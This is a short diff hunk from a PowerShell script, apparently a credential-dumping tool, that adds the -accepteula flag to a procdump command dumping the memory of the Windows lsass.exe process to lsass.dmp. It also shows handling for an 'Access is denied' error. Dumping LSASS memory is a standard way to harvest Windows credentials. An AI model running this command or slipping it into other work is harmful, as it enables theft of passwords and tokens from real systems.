@@ -146,7 +146,7 @@ function processdump() {
     if ($procdump) {
         $accessdump = $true
         try {
-            .\procdump.exe -ma lsass.exe lsass.dmp    
+            .\procdump.exe -ma lsass.exe lsass.dmp -accepteula    
         }
         catch {
             if ($error[0] -match "Access is denied") {
